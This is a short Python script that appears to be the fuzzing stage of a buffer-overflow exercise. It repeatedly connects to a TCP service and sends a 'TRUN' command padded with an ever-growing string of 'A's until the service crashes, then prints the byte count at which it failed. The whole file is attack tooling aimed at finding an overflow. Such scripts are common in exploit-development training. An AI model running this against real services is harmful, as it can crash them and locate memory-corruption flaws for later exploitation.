#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100
address = '127.0.0.1' ##CHANGE THIS
port = 9999 ##CHANGE THIS


while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((address,port))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()

	finally:
		s.close()
